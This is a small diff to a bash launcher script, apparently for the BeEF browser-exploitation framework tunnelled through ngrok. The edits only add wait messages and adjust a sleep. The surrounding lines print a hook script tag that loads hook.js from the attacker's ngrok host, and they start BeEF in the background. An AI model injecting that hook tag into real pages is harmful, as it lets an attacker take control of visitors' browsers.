@@ -129,7 +129,7 @@ function write_(){
 	echo 'BEEF FAST JAVASCRIPT CODE: <script src="http://'$ngrok_url':80/hook.js"></script>' >> links/links.txt
 	echo "BEEF USERNAME: $username" >> links/links.txt
 	echo "BEEF PASSWORD: $password" >> links/links.txt
-	
+	echo "Wait for 5 seconds before opening the links"
 	if [[ $port_number == "" ]];then
 		echo "BEEF PORT NO: 3000" >> links/links.txt
 	else
@@ -220,7 +220,7 @@ function main(){
 		echo 'BEEF JAVASCRIPT KODU: <script src="http://'$ngrok_url':80/hook.js"></script>' 
 		echo "BEEF KULLANICI ADI: $username"
 		echo "BEEF PAROLA: $password"
-		sleep 2
+		echo "Linkleri acmadan once 5 saniye kadar bekleyin."
 		if [[ $port_number == "" ]];then
 			
 			cd beef/ && ./beef &> /dev/null &
@@ -228,7 +228,7 @@ function main(){
 		else
 			cd beef/ && ./beef -p  $port_number &> /dev/null &
 		fi
-		
+		sleep 5
 	
 		
 	fi
